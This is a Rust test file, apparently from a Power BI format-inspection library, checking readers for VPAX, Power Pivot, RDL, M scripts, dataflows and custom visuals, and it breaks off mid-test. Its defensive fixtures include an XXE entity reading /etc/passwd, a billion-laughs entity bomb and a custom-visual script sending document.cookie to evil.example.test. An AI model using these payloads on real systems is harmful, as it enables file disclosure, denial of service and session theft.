//! Readers for the "other" formats (FORMATS.md §5): VPAX, Excel Power Pivot,
//! RDL, M scripts, Power Query templates, dataflows, custom visuals and
//! connectors. All inputs are synthetic (built here or committed under
//! `tests/data/formats/`); hostile inputs check the safety rules.

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
#![recursion_limit = "512"]

use std::io::{Cursor, Write};
use std::path::{Path, PathBuf};

use pbi_core::detect::DetectedFormat;
use pbi_core::redact::REDACTED;
use pbi_core::{CoreError, ModelSource, OpenOptions, OpenedDocument, codes, open_bytes, open_path};
use pbi_model::{
    ColumnKind, DataType, Document, ModelStatus, PartitionSource, Severity, SourceFormat,
};
use pretty_assertions::assert_eq;
use serde_json::json;
use zip::ZipWriter;
use zip::write::SimpleFileOptions;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn data(rel: &str) -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("tests/data/formats")
        .join(rel)
}

fn zip_of(files: &[(&str, &[u8])]) -> Vec<u8> {
    let opts = SimpleFileOptions::default();
    let mut w = ZipWriter::new(Cursor::new(Vec::new()));
    for (name, data) in files {
        w.start_file(*name, opts).unwrap();
        w.write_all(data).unwrap();
    }
    w.finish().unwrap().into_inner()
}

fn open_zip(name: &str, files: &[(&str, &[u8])]) -> OpenedDocument {
    open_bytes(name, zip_of(files), &OpenOptions::default())
        .unwrap_or_else(|e| panic!("open {name}: {e}"))
}

fn codes_of(doc: &Document, severity: Severity) -> Vec<String> {
    doc.diagnostics
        .iter()
        .filter(|d| d.severity == severity)
        .map(|d| d.code.clone())
        .collect()
}

fn has_diag(doc: &Document, code: &str) -> bool {
    doc.diagnostics.iter().any(|d| d.code == code)
}

fn tmp_dir() -> tempfile::TempDir {
    tempfile::Builder::new()
        .prefix("pbi-core-formats-")
        .tempdir_in(env!("CARGO_TARGET_TMPDIR"))
        .unwrap()
}

/// Serialized document + outline must never contain `secret`.
fn assert_no_leak(opened: &OpenedDocument, secret: &str) {
    let json = opened.inspect_json().to_string();
    assert!(!json.contains(secret), "{secret} leaked");
}

// ---------------------------------------------------------------------------
// VPAX
// ---------------------------------------------------------------------------

/// `DaxModel.json` as VertiPaq Analyzer writes it (`PreserveReferencesHandling.All`).
fn dax_model() -> serde_json::Value {
    json!({
        "$id": "1",
        "DaxModelVersion": "1.9.0",
        "ExtractorApp": "DAX Studio",
        "ExtractorAppVersion": "3.2.1",
        "ModelName": "Sales Model",
        "CompatibilityLevel": 1601,
        "ExtractionDate": "2026-10-21T10:00:00Z",
        "Culture": "en-US",
        "Tables": {"$id": "2", "$values": [
            {"$id": "3", "Model": {"$ref": "1"}, "TableName": "Sales", "RowsCount": 1000,
             "Columns": {"$id": "4", "$values": [
                {"$id": "5", "ColumnName": "ProductKey", "ColumnCardinality": 50,
                 "DataType": "Int64", "ColumnType": "Data", "Encoding": "VALUE",
                 "DictionarySize": 100,
                 "ColumnSegments": {"$id": "6", "$values": [
                    {"$id": "7", "Partition": {"$id": "8", "PartitionName": "Sales", "Type": 4, "Mode": 0},
                     "SegmentNumber": 0, "SegmentRows": 1000, "UsedSize": 400}
                 ]},
                 "ColumnHierarchies": {"$id": "9", "$values": [{"$id": "10", "UsedSize": 24}]}},
                {"$id": "11", "ColumnName": "Margin", "ColumnCardinality": 900,
                 "DataType": "Double", "ColumnType": "Calculated", "ColumnExpression": "[Amount] * 0.2",
                 "Encoding": "HASH", "DictionarySize": 7200, "DataSize": 1600, "HierarchiesSize": 0,
                 "IsHidden": true},
                {"$id": "12", "ColumnName": "RowNumber-2662979B", "ColumnType": "RowNumber",
                 "DataType": "Int64", "IsHidden": true}
             ]},
             "Measures": {"$id": "13", "$values": [
                {"$id": "14", "MeasureName": "Total Margin", "MeasureExpression": "SUM(Sales[Margin])",
                 "FormatString": "#,0.00", "DisplayFolder": "KPIs"}
             ]},
             "Partitions": {"$id": "15", "$values": [{"$ref": "8"}]}},
            {"$id": "16", "Model": {"$ref": "1"}, "TableName": {"Name": "Product"}, "RowsCount": 50,
             "Columns": {"$id": "17", "$values": [
                {"$id": "18", "ColumnName": "ProductKey", "ColumnCardinality": 50,
                 "DataType": "Int64", "Encoding": "VALUE", "DictionarySize": 120, "DataSize": 80},
                {"$id": "19", "ColumnName": "Name", "ColumnCardinality": 50,
                 "DataType": "String", "Encoding": "HASH", "DictionarySize": 3000, "DataSize": 80,
                 "SortByColumnName": "ProductKey"}
             ]},
             "UserHierarchies": {"$id": "20", "$values": [
                {"$id": "21", "HierarchyName": "Catalog", "UsedSize": 64,
                 "Levels": {"$id": "22", "$values": [{"$ref": "19"}]}}
             ]}}
        ]},
        "Relationships": {"$id": "23", "$values": [
            {"$id": "24", "FromColumn": {"$ref": "5"}, "FromCardinalityType": "Many",
             "ToColumn": {"$ref": "18"}, "ToCardinalityType": "One", "IsActive": true,
             "CrossFilteringBehavior": "OneDirection", "UsedSizeFrom": 300, "UsedSizeTo": 16,
             "MissingKeys": 2, "InvalidRows": 5}
        ]}
    })
}

const MODEL_BIM: &str = r#"{
  "name": "Sales Model",
  "compatibilityLevel": 1601,
  "model": {
    "culture": "en-US",
    "tables": [
      {"name": "Sales", "columns": [{"name": "ProductKey", "dataType": "int64", "sourceColumn": "ProductKey"}],
       "partitions": [{"name": "Sales", "mode": "import", "source": {"type": "m", "expression": "let Source = 1 in Source"}}]},
      {"name": "Product", "columns": [{"name": "ProductKey", "dataType": "int64", "sourceColumn": "ProductKey"}]}
    ]
  }
}"#;

#[test]
fn vpax_reads_model_bim_and_dax_model_statistics() {
    let dax = dax_model().to_string();
    let opened = open_zip(
        "Sales.vpax",
        &[
            ("[Content_Types].xml", b"<Types/>"),
            ("DaxModel.json", dax.as_bytes()),
            ("DaxVpaView.json", br#"{"Tables": []}"#),
            ("Model.bim", MODEL_BIM.as_bytes()),
            ("CompatabilityMode.txt", b"PowerBI"),
        ],
    );
    let doc = &opened.document;
    assert_eq!(doc.source.format, SourceFormat::Vpax);
    assert!(matches!(opened.detection.format, DetectedFormat::Vpax));
    assert!(
        codes_of(doc, Severity::Error).is_empty(),
        "{:?}",
        doc.diagnostics
    );
    // The model comes from Model.bim (with its M partition).
    assert!(matches!(
        opened.model_source,
        Some(ModelSource::Tmsl { .. })
    ));
    let model = doc.model.as_ref().unwrap();
    assert_eq!(model.tables.len(), 2);
    assert!(matches!(
        model.tables[0].partitions[0].source,
        PartitionSource::M { .. }
    ));
    assert_eq!(doc.model_status, ModelStatus::Local);

    let stats = opened.vpax_stats().unwrap();
    assert_eq!(stats.source, "DaxModel.json");
    assert_eq!(stats.model_name.as_deref(), Some("Sales Model"));
    assert_eq!(stats.extractor.as_deref(), Some("DAX Studio 3.2.1"));
    assert_eq!(stats.compatibility_level, Some(1601));
    let sales = &stats.tables[0];
    assert_eq!((sales.name.as_str(), sales.rows_count), ("Sales", 1000));
    let key = &sales.columns[0];
    assert_eq!(key.name, "ProductKey");
    assert_eq!(key.cardinality, 50);
    // Data from the segments, hierarchies from the column hierarchies.
    assert_eq!(
        (
            key.data_size,
            key.dictionary_size,
            key.hierarchies_size,
            key.total_size
        ),
        (400, 100, 24, 524)
    );
    assert_eq!(key.segments, 1);
    assert_eq!(key.encoding.as_deref(), Some("VALUE"));
    let margin = &sales.columns[1];
    assert_eq!((margin.total_size, margin.is_hidden), (8800, true));
    // Relationship sizes go to both ends.
    assert_eq!(sales.relationships_size, 300);
    assert_eq!(sales.table_size, sales.columns_size + 300);
    let product = &stats.tables[1];
    assert_eq!(product.name, "Product");
    assert_eq!(product.user_hierarchies_size, 64);
    assert_eq!(product.relationships_size, 16);
    assert_eq!(product.table_size, 120 + 80 + 3000 + 80 + 64 + 16);
    assert_eq!(
        stats.total_size,
        stats.tables.iter().map(|t| t.table_size).sum::<u64>()
    );
    let rel = &stats.relationships[0];
    assert_eq!(
        (
            rel.from_table.as_str(),
            rel.to_table.as_str(),
            rel.used_size,
            rel.missing_keys
        ),
        ("Sales", "Product", 316, 2)
    );
    // Every interpreted part is consumed.
    assert!(
        doc.extra_parts
            .iter()
            .all(|p| p.path == "[Content_Types].xml")
    );
    assert!(opened.inspect_json()["outline"]["kind"] == "vpax");
}

#[test]
fn vpax_without_model_bim_rebuilds_the_model_from_dax_model() {
    let dax = dax_model().to_string();
    let opened = open_zip("Sales.vpax", &[("DaxModel.json", dax.as_bytes())]);
    let doc = &opened.document;
    assert!(has_diag(doc, codes::VPAX));
    let model = doc.model.as_ref().unwrap();
    assert_eq!(model.name, "Sales Model");
    assert_eq!(model.culture.as_deref(), Some("en-US"));
    assert_eq!(model.compatibility_level(), Some(1601));
    let sales = model.table("Sales").unwrap();
    // The row-number column is internal.
    assert_eq!(sales.columns.len(), 2);
    assert_eq!(sales.columns[0].data_type, DataType::Int64);
    assert_eq!(
        sales.column("Margin").unwrap().kind,
        ColumnKind::Calculated {
            expression: "[Amount] * 0.2".into()
        }
    );
    assert_eq!(sales.measures[0].name, "Total Margin");
    assert_eq!(sales.measures[0].display_folder.as_deref(), Some("KPIs"));
    assert_eq!(sales.partitions[0].source.kind_name(), "m");
    let product = model.table("Product").unwrap();
    assert_eq!(
        product.column("Name").unwrap().sort_by_column.as_deref(),
        Some("ProductKey")
    );
    assert_eq!(product.hierarchies[0].levels[0].column, "Name");
    let rel = &model.relationships[0];
    assert_eq!(
        (
            rel.from.table.as_str(),
            rel.from.column.as_str(),
            rel.to.table.as_str()
        ),
        ("Sales", "ProductKey", "Product")
    );
    assert!(rel.is_active);
}

#[test]
fn vpax_view_is_the_fallback_and_broken_parts_are_warnings() {
    let view = json!({
        "Tables": [{"TableName": "T", "RowsCount": 3, "ColumnsSize": 60, "TableSize": 70,
                    "RelationshipsSize": 10}],
        "Columns": [{"TableName": "T", "ColumnName": "C", "ColumnCardinality": 3,
                     "DataSize": 8, "DictionarySize": 40, "HierarchiesSize": 12, "TotalSize": 60,
                     "Encoding": "HASH"}],
        "ColumnsSegments": [{"TableName": "T", "ColumnName": "C"}, {"TableName": "T", "ColumnName": "C"}]
    })
    .to_string();
    let opened = open_zip(
        "View.vpax",
        &[
            ("DaxModel.json", b"{ not json"),
            ("DaxVpaView.json", view.as_bytes()),
        ],
    );
    let doc = &opened.document;
    assert!(codes_of(doc, Severity::Warning).contains(&codes::VPAX.to_owned()));
    let stats = opened.vpax_stats().unwrap();
    assert_eq!(stats.source, "DaxVpaView.json");
    assert_eq!(stats.tables[0].table_size, 70);
    assert_eq!(stats.tables[0].columns[0].segments, 2);
    assert_eq!(stats.total_size, 70);
    // No Model.bim and no readable DaxModel.json: no model.
    assert!(doc.model.is_none());
    assert!(has_diag(doc, codes::NO_MODEL));
}

// ---------------------------------------------------------------------------
// Excel Power Pivot
// ---------------------------------------------------------------------------

fn workbook(item_data: Option<&[u8]>) -> Vec<u8> {
    let mut files: Vec<(&str, &[u8])> = vec![
        ("[Content_Types].xml", b"<Types/>"),
        ("xl/workbook.xml", b"<workbook/>"),
        ("xl/worksheets/sheet1.xml", b"<worksheet/>"),
    ];
    if let Some(data) = item_data {
        files.push(("xl/model/item.data", data));
    }
    zip_of(&files)
}

#[test]
fn power_pivot_workbook_loads_its_schema_and_data() {
    let abf = pbi_vertipaq::test_support::power_pivot_sample();
    let opened = open_bytes("Sales.xlsx", workbook(Some(&abf)), &OpenOptions::default()).unwrap();
    let doc = &opened.document;
    assert_eq!(doc.source.format, SourceFormat::PowerPivot);
    assert!(
        codes_of(doc, Severity::Error).is_empty(),
        "{:?}",
        doc.diagnostics
    );
    assert!(
        codes_of(doc, Severity::Warning).is_empty(),
        "{:?}",
        doc.diagnostics
    );
    // VPQ005 notes the legacy XML metadata (schema and storage read from XML).
    assert!(codes_of(doc, Severity::Info).contains(&"VPQ005".to_owned()));
    assert!(has_diag(doc, codes::POWER_PIVOT));
    let model = doc.model.as_ref().unwrap();
    let names: Vec<&str> = model.tables.iter().map(|t| t.name.as_str()).collect();
    assert_eq!(names, ["Sales", "Product"]);
    assert_eq!(
        model.table("Sales").unwrap().measures[0].name,
        "Total Sales"
    );
    assert_eq!(model.relationships.len(), 1);
    assert_eq!(model.compatibility_level(), Some(1103));
    match &opened.model_source {
        Some(ModelSource::Abf {
            entry,
            archive,
            storage,
            ..
        }) => {
            assert_eq!(entry, "xl/model/item.data");
            assert!(archive.is_compressed());
            // The data is decodable (what the session does on load).
            let decoded = pbi_vertipaq::decode_all_with_diagnostics(
                archive,
                storage,
                model,
                &pbi_vertipaq::DecodeLimits::default(),
            );
            assert!(decoded.diagnostics.is_empty(), "{:?}", decoded.diagnostics);
            let rows: Vec<(&str, usize)> = decoded
                .tables
                .iter()
                .map(|(n, b)| (n.as_str(), b.num_rows()))
                .collect();
            assert_eq!(rows, [("Sales", 3), ("Product", 2)]);
        }
        other => panic!("unexpected model source {other:?}"),
    }
    assert!(
        doc.extra_parts
            .iter()
            .all(|p| p.path != "xl/model/item.data")
    );
    assert_no_leak(&opened, "hunter2");

    // Schema loading can be switched off.
    let off = OpenOptions {
        load_pbix_schema: false,
        ..OpenOptions::default()
    };
    let opened = open_bytes("Sales.xlsx", workbook(Some(&abf)), &off).unwrap();
    assert!(opened.document.model.is_none());
}

#[test]
fn workbooks_without_a_model_or_with_a_broken_one_do_not_fail() {
    let opened = open_bytes("Plain.xlsx", workbook(None), &OpenOptions::default()).unwrap();
    assert_eq!(opened.detection.format, DetectedFormat::ExcelNoModel);
    assert!(opened.document.model.is_none());
    assert!(has_diag(&opened.document, codes::NO_MODEL));

    let opened = open_bytes(
        "Broken.xlsx",
        workbook(Some(b"not a backup")),
        &OpenOptions::default(),
    )
    .unwrap();
    assert!(opened.document.model.is_none());
    assert!(codes_of(&opened.document, Severity::Error).contains(&codes::MODEL_FAILED.to_owned()));
}

// ---------------------------------------------------------------------------
// RDL
// ---------------------------------------------------------------------------

#[test]
fn rdl_outline_lists_sources_datasets_parameters_and_items() {
    let opened = open_path(&data("Sales.rdl"), &OpenOptions::default()).unwrap();
    let doc = &opened.document;
    assert_eq!(doc.source.format, SourceFormat::Rdl);
    assert!(
        codes_of(doc, Severity::Error).is_empty(),
        "{:?}",
        doc.diagnostics
    );
    assert!(doc.model.is_none() && doc.reports.is_empty());
    // A dataset queries a Power BI semantic model: remote.
    assert!(matches!(doc.model_status, ModelStatus::Remote { .. }));
    let r = opened.paginated_report().unwrap();
    assert_eq!(r.schema.as_deref(), Some("2016/01"));
    assert_eq!(r.author.as_deref(), Some("Test Author"));

    let ds: Vec<(&str, Option<&str>, Option<&str>)> = r
        .data_sources
        .iter()
        .map(|d| {
            (
                d.name.as_str(),
                d.data_provider.as_deref(),
                d.connection_string.as_deref(),
            )
        })
        .collect();
    assert_eq!(
        ds,
        [
            ("SalesDb", Some("SQL"), Some(REDACTED)),
            ("Model", Some("PBIDATASET"), Some(REDACTED)),
            ("Shared", None, None),
        ]
    );
    assert_eq!(
        r.data_sources[2].shared_reference.as_deref(),
        Some("/Data Sources/Warehouse")
    );
    assert_eq!(r.data_sources[1].integrated_security, Some(true));
    assert!(has_diag(doc, codes::REDACTED));
    assert_no_leak(&opened, "fake-test-password");
    assert_no_leak(&opened, "sql.example.test");

    let sales = &r.datasets[0];
    assert_eq!(sales.data_source.as_deref(), Some("SalesDb"));
    assert!(
        sales
            .command_text
            .as_deref()
            .unwrap()
            .starts_with("SELECT Region")
    );
    let fields: Vec<(&str, Option<&str>)> = sales
        .fields
        .iter()
        .map(|f| (f.name.as_str(), f.type_name.as_deref()))
        .collect();
    assert_eq!(
        fields,
        [
            ("Region", Some("System.String")),
            ("Amount", Some("System.Decimal")),
            ("AmountK", None)
        ]
    );
    assert_eq!(
        sales.fields[2].value.as_deref(),
        Some("=Fields!Amount.Value / 1000")
    );
    assert_eq!(sales.query_parameters[0].name, "@Year");
    assert_eq!(sales.filters, 1);

    let year = &r.parameters[0];
    assert_eq!(year.data_type.as_deref(), Some("Integer"));
    assert_eq!(year.default_values, ["2026"]);
    assert_eq!(year.valid_values_dataset.as_deref(), Some("Years"));
    let regions = &r.parameters[1];
    assert!(regions.multi_value && regions.hidden && regions.nullable);
    assert_eq!(regions.valid_values, 2);

    let section = &r.sections[0];
    assert_eq!(section.page_width.as_deref(), Some("8.5in"));
    let body: Vec<(&str, &str)> = section
        .body
        .iter()
        .map(|i| (i.kind.as_str(), i.name.as_str()))
        .collect();
    assert_eq!(
        body,
        [
            ("textbox", "Title"),
            ("tablix", "SalesTable"),
            ("rectangle", "Panel")
        ]
    );
    assert_eq!(section.body[0].value.as_deref(), Some("Sales by region"));
    let tablix = &section.body[1];
    assert_eq!(tablix.dataset.as_deref(), Some("SalesByRegion"));
    let cells: Vec<&str> = tablix.children.iter().map(|c| c.name.as_str()).collect();
    assert_eq!(cells, ["RegionCell", "AmountCell"]);
    let panel = &section.body[2];
    assert_eq!(
        panel.children[1].report_name.as_deref(),
        Some("RegionDetails")
    );
    assert_eq!(section.header[0].kind, "image");
    assert_eq!(
        section.footer[0].value.as_deref(),
        Some("=Globals!PageNumber")
    );
    assert_eq!(r.embedded_images, ["LogoImage"]);
    assert_eq!(r.item_count, 9);
    assert!(!r.truncated);
}

#[test]
fn rdl_hostile_xml_is_refused_without_expansion() {
    // XXE: an external entity must never be resolved.
    let xxe = br#"<?xml version="1.0"?><!DOCTYPE Report [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><Report xmlns="http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition"><Description>&xxe;</Description></Report>"#;
    // Billion laughs: nested internal entities must never be expanded.
    let mut lol = String::from(r#"<?xml version="1.0"?><!DOCTYPE Report [<!ENTITY lol "lol">"#);
    for i in 1..10 {
        let prev = if i == 1 {
            "lol".to_owned()
        } else {
            format!("lol{}", i - 1)
        };
        lol.push_str(&format!(
            r#"<!ENTITY lol{i} "{}">"#,
            format!("&{prev};").repeat(10)
        ));
    }
    lol.push_str(r#"]><Report xmlns="http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition"><Description>&lol9;</Description></Report>"#);
    for (name, bytes) in [("xxe.rdl", xxe.to_vec()), ("lol.rdl", lol.into_bytes())] {
        let opened = open_bytes(name, bytes, &OpenOptions::default()).unwrap();
        let doc = &opened.document;
        assert_eq!(doc.source.format, SourceFormat::Rdl, "{name}");
        assert!(opened.outline.is_none(), "{name}");
        let error = doc
            .diagnostics
            .iter()
            .find(|d| d.code == codes::PAGINATED && d.severity == Severity::Error)
            .unwrap_or_else(|| panic!("{name}: no error"));
        assert!(
            error.message.contains("refused"),
            "{name}: {}",
            error.message
        );
        assert_no_leak(&opened, "root:");
        assert_no_leak(&opened, "lollollol");
    }

    // Not a report, and malformed XML.
    for bytes in [
        &br#"<Report xmlns="http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition"><Body>"#[..],
        &b"<?xml version=\"1.0\"?><Report><DataSets><DataSet Name=\"x\"></Report>"[..],
    ] {
        let opened = open_bytes("bad.rdl", bytes.to_vec(), &OpenOptions::default()).unwrap();
        assert!(codes_of(&opened.document, Severity::Error).contains(&codes::PAGINATED.to_owned()));
    }
}

#[test]
fn rdl_deep_nesting_is_truncated() {
    let mut xml = String::from(
        r#"<Report xmlns="http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition"><ReportSections><ReportSection><Body><ReportItems>"#,
    );
    for i in 0..40 {
        xml.push_str(&format!(r#"<Rectangle Name="R{i}"><ReportItems>"#));
    }
    xml.push_str(r#"<Textbox Name="Deep"/>"#);
    for _ in 0..40 {
        xml.push_str("</ReportItems></Rectangle>");
    }
    xml.push_str("</ReportItems></Body></ReportSection></ReportSections></Report>");
    let opened = open_bytes("deep.rdl", xml.into_bytes(), &OpenOptions::default()).unwrap();
    let r = opened.paginated_report().unwrap();
    assert!(r.truncated);
    assert_eq!(r.item_count, 32);
    assert!(has_diag(&opened.document, codes::PAGINATED));
}

// ---------------------------------------------------------------------------
// M scripts, templates, dataflows
// ---------------------------------------------------------------------------

#[test]
fn m_script_becomes_named_expressions() {
    let opened = open_path(&data("Queries.pq"), &OpenOptions::default()).unwrap();
    let doc = &opened.document;
    assert_eq!(doc.source.format, SourceFormat::PowerQueryScript);
    assert!(
        codes_of(doc, Severity::Error).is_empty(),
        "{:?}",
        doc.diagnostics
    );
    let model = doc.model.as_ref().unwrap();
    assert_eq!(model.name, "Queries");
    let names: Vec<&str> = model.expressions.iter().map(|e| e.name.as_str()).collect();
    assert_eq!(names, ["BaseUrl", "Sales", "Sales by Region"]);
    let base = &model.expressions[0];
    assert!(base.is_parameter());
    assert_eq!(base.expression, "\"https://example.test/api\"");
    assert_eq!(base.origin.as_ref().and_then(|o| o.line), Some(4));
    assert!(model.expressions[1].expression.starts_with("let"));
    assert!(model.expressions[1].expression.ends_with("Promoted"));
    // The private `Helper` member is noted, not listed.
    assert!(has_diag(doc, codes::MASHUP));
    let mashup = opened.mashup().unwrap();
    assert_eq!(mashup.kind, "script");
    assert_eq!(mashup.section.as_deref(), Some("Section1"));
    assert_eq!(mashup.queries.len(), 3);

    // A single expression is one query named after the file.
    let opened = open_bytes(
        "Single.pq",
        b"let\n  Source = 1\nin\n  Source".to_vec(),
        &OpenOptions::default(),
    )
    .unwrap();
    let model = opened.document.model.as_ref().unwrap();
    assert_eq!(model.expressions[0].name, "Single");
}

#[test]
fn m_syntax_errors_are_diagnostics_and_other_queries_survive() {
    let src = "section Section1;\nshared Good = 1 + 2;\nshared Bad = let x = in x;\nshared AlsoGood = \"a\";\n";
    let opened = open_bytes(
        "Broken.pq",
        src.as_bytes().to_vec(),
        &OpenOptions::default(),
    )
    .unwrap();
    let doc = &opened.document;
    let error = doc
        .diagnostics
        .iter()
        .find(|d| d.code == codes::M_SYNTAX && d.severity == Severity::Error)
        .unwrap();
    assert_eq!(error.origin.as_ref().and_then(|o| o.line), Some(3));
    let warning = doc
        .diagnostics
        .iter()
        .find(|d| d.code == codes::M_SYNTAX && d.severity == Severity::Warning)
        .unwrap();
    assert!(warning.message.contains("`Bad`"), "{}", warning.message);
    let names: Vec<&str> = doc
        .model
        .as_ref()
        .unwrap()
        .expressions
        .iter()
        .map(|e| e.name.as_str())
        .collect();
    assert_eq!(names, ["Good", "Bad", "AlsoGood"]);
    let flags: Vec<bool> = opened
        .mashup()
        .unwrap()
        .queries
        .iter()
        .map(|q| q.syntax_error)
        .collect();
    assert_eq!(flags, [false, true, false]);
}

#[test]
fn power_query_template_has_queries_and_groups() {
    let m = "section Section1;\r\nshared Source = \"x\";\r\nshared Clean = Source & \"y\";\r\n";
    let meta = json!({
        "Version": "1.0",
        "QueryGroups": [
            {"Id": "g1", "Name": "Staging", "Order": 0},
            {"Id": "g2", "Name": "Raw", "ParentId": "g1", "Order": 1},
            {"Id": "g3", "Name": "Unused"}
        ],
        "QueriesMetadata": {
            "Source": {"QueryId": "q1", "QueryName": "Source", "QueryGroupId": "g2", "LoadEnabled": false},
            "Clean": {"QueryId": "q2", "QueryName": "Clean", "IsHidden": true}
        }
    })
    .to_string();
    let template = json!({"Name": "Sales template", "Description": "Synthetic"}).to_string();
    let opened = open_zip(
        "Sales.pqt",
        &[
            ("[Content_Types].xml", b"<Types/>"),
            ("MashupDocument.pq", m.as_bytes()),
            ("MashupMetadata.json", meta.as_bytes()),
            ("Metadata.json", template.as_bytes()),
        ],
    );
    let doc = &opened.document;
    assert_eq!(doc.source.format, SourceFormat::PowerQueryTemplate);
    assert!(
        codes_of(doc, Severity::Error).is_empty(),
        "{:?}",
        doc.diagnostics
    );
    let model = doc.model.as_ref().unwrap();
    assert_eq!(model.name, "Sales template");
    assert_eq!(model.description.as_deref(), Some("Synthetic"));
    let source = &model.expressions[0];
    assert_eq!(source.query_group.as_deref(), Some("Staging\\Raw"));
    assert_eq!(
        source.origin.as_ref().map(|o| o.path.as_str()),
        Some("MashupDocument.pq")
    );
    let groups: Vec<&str> = model
        .query_groups
        .iter()
        .map(|g| g.folder.as_str())
        .collect();
    assert_eq!(groups, ["Staging", "Staging\\Raw", "Unused"]);
    let q = &opened.mashup().unwrap().queries;
    assert_eq!(q[0].load_enabled, Some(false));
    assert_eq!(q[1].hidden, Some(true));
    assert!(opened.part("mashupMetadata").is_some());
    assert!(
        doc.extra_parts
            .iter()
            .all(|p| p.path != "MashupDocument.pq")
    );
}

#[test]
fn dataflow_gen2_folder_reads_mashup_and_metadata() {
    let dir = tmp_dir();
    let root = dir.path().join("Sales.Dataflow");
    std::fs::create_dir_all(&root).unwrap();
    std::fs::write(
        root.join(".platform"),
        r#"{"$schema": "https://developer.microsoft.com/json-schemas/fabric/gitIntegration/platformProperties/2.0.0/schema.json", "metadata": {"type": "Dataflow", "displayName": "Sales flow"}, "config": {"version": "2.0", "logicalId": "00000000-0000-0000-0000-000000000000"}}"#,
    )
    .unwrap();
    std::fs::write(
        root.join("mashup.pq"),
        "[StagingDefinition = [Kind = \"FastCopy\"]]\r\nsection Section1;\r\nshared holidays = let Source = Lakehouse.Contents([]) in Source;\r\n",
    )
    .unwrap();
    std::fs::write(
        root.join("queryMetadata.json"),
        json!({
            "formatVersion": "202502",
            "name": "SalesFlow",
            "documentLocale": "en-US",
            "queriesMetadata": {"holidays": {"queryId": "q", "queryName": "holidays", "loadEnabled": true}},
            "connections": [{"path": "https://x.example.test/f?sig=abc&sv=1", "kind": "Web", "connectionId": "c"}]
        })
        .to_string(),
    )
    .unwrap();
    let opened = open_path(&root, &OpenOptions::default()).unwrap();
    let doc = &opened.document;
    assert_eq!(opened.detection.format, DetectedFormat::DataflowFolder);
    assert!(
        codes_of(doc, Severity::Error).is_empty(),
        "{:?}",
        doc.diagnostics
    );
    let model = doc.model.as_ref().unwrap();
    assert_eq!(model.name, "SalesFlow");
    assert_eq!(model.expressions[0].name, "holidays");
    let mashup = opened.mashup().unwrap();
    assert_eq!(mashup.kind, "dataflowGen2");
    assert_eq!(mashup.queries[0].load_enabled, Some(true));
    assert_eq!(
        mashup.connections[0].path.as_deref(),
        Some("https://x.example.test/f?sig=<redacted>&sv=1")
    );
    assert!(opened.part("platform").is_some());
}

#[test]
fn dataflow_model_json_maps_entities_to_tables() {
    let opened = open_path(&data("dataflow/model.json"), &OpenOptions::default()).unwrap();
    let doc = &opened.document;
    assert_eq!(doc.source.format, SourceFormat::DataflowModel);
    assert!(
        codes_of(doc, Severity::Error).is_empty(),
        "{:?}",
        doc.diagnostics
    );
    let model = doc.model.as_ref().unwrap();
    assert_eq!(model.name, "Sales Dataflow");
    assert_eq!(model.culture.as_deref(), Some("en-US"));
    let customers = model.table("Customers").unwrap();
    let types: Vec<(&str, DataType)> = customers
        .columns
        .iter()
        .map(|c| (c.name.as_str(), c.data_type.clone()))
        .collect();
    assert_eq!(
        types,
        [
            ("CustomerId", DataType::Int64),
            ("Name", DataType::String),
            ("Region", DataType::String),
            ("Created", DataType::DateTime),
            ("Balance", DataType::Decimal),
            ("Active", DataType::Boolean),
        ]
    );
    match &customers.partitions[0].source {
        PartitionSource::M { expression } => {
            assert!(expression.contains("Sql.Database"), "{expression}");
        }
        other => panic!("unexpected source {other:?}"),
    }
    // The non-entity query is a shared expression (a parameter).
    assert_eq!(model.expressions.len(), 1);
    assert!(model.expressions[0].is_parameter());
    let mashup = opened.mashup().unwrap();
    let entity = &mashup.entities[0];
    assert_eq!((entity.attributes, entity.partitions.len()), (6, 1));
    let location = entity.partitions[0].location.as_deref().unwrap();
    assert!(location.contains("sig=<redacted>"), "{location}");
    assert_no_leak(&opened, "SECRETSIGNATURE");
    assert!(
        mashup
            .queries
            .iter()
            .any(|q| q.entity && q.name == "Customers")
    );
    assert_eq!(mashup.connections[0].kind.as_deref(), Some("SQL"));
}

// ---------------------------------------------------------------------------
// Custom visuals and connectors
// ---------------------------------------------------------------------------

#[test]
fn pbiviz_metadata_is_read_and_the_script_never_runs() {
    let package = json!({
        "version": "1.2.3",
        "author": {"name": "Visual Author", "email": "author@example.test"},
        "resources": [{"resourceId": "rId0", "sourceType": 5, "file": "resources/abc123.pbiviz.json"}],
        "visual": {"name": "fancyBars", "displayName": "Fancy Bars", "guid": "fancyBarsABC123", "version": "1.2.3"}
    })
    .to_string();
    let resource = json!({
        "visual": {"name": "fancyBars", "displayName": "Fancy Bars", "guid": "fancyBarsABC123",
                   "version": "1.2.3", "description": "Bars, but fancy", "supportUrl": "https://example.test"},
        "apiVersion": "5.3.0",
        "author": {"name": "Visual Author", "email": "author@example.test"},
        "capabilities": {
            "dataRoles": [
                {"name": "category", "displayName": "Category", "kind": "Grouping"},
                {"name": "measure", "displayName": "Values", "kind": 1}
            ],
            "objects": {"dataPoint": {}, "legend": {}},
            "privileges": [{"name": "WebAccess", "essential": true, "parameters": ["https://*.example.test"]}]
        },
        "content": {"js": "fetch('https://evil.example.test/' + document.cookie)", "css": ".x{}", "iconBase64": ""}
    })
    .to_string();
    let opened = open_zip(
        "FancyBars.pbiviz",
        &[
            ("package.json", package.as_bytes()),
            ("resources/abc123.pbiviz.json", resource.as_bytes()),
        ],
    );
    let doc = &opened.document;
    assert_eq!(doc.source.format, SourceFormat::Pbiviz);
    assert!(doc.model.is_none());
    let v = opened.custom_visual().unwrap();
    assert_eq!(v.display_name.as_deref(), Some("Fancy Bars"));
    assert_eq!(v.guid.as_deref(), Some("fancyBarsABC123"));
    assert_eq!(v.api_version.as_deref(), Some("5.3.0"));
    assert_eq!(v.author.as_deref(), Some("Visual Author"));
    let roles: Vec<(&str, Option<&str>)> = v
        .data_roles
        .iter()
        .map(|r| (r.name.as_str(), r.kind.as_deref()))
        .collect();
    assert_eq!(
        roles,
        [("category", Some("Grouping")), ("measure", Some("Measure"))]
    );
    assert_eq!(v.objects, ["dataPoint", "legend"]);
